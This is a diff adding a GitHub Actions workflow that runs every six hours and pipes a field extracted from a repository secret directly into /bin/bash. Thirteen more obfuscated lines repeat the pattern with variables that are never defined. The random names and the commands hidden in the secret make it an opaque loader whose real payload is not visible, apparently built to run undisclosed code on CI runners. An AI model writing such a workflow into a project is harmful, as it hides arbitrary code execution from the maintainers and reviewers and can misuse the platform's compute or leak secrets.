@@ -1,0 +1,29 @@
+name: chenxichengqian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenxichengqian
+        env:
+          ceunt0: ${{ secrets.ceunt0 }}
+        run: |
+          echo $ceunt0 | jq -r .goqa5 | /bin/bash
+          echo $jo09 | jq -r .v0728 | /bin/bash
+          echo $ataa70 | jq -r .ceiu391 | /bin/bash
+          echo $fi9799 | jq -r .uh927 | /bin/bash
+          echo $ah05 | jq -r .myubj49 | /bin/bash
+          echo $gyg7965 | jq -r .xxna92249 | /bin/bash
+          echo $l4759 | jq -r .uq65 | /bin/bash
+          echo $twj8 | jq -r .teytf45 | /bin/bash
+          echo $efq8 | jq -r .vaevt03466 | /bin/bash
+          echo $t4 | jq -r .v0 | /bin/bash
+          echo $gx7 | jq -r .ofxy84 | /bin/bash
+          echo $hkvfs194 | jq -r .ku58017 | /bin/bash
+          echo $ekg3 | jq -r .z5974 | /bin/bash
+          echo $qqc4 | jq -r .mjhof5 | /bin/bash
+
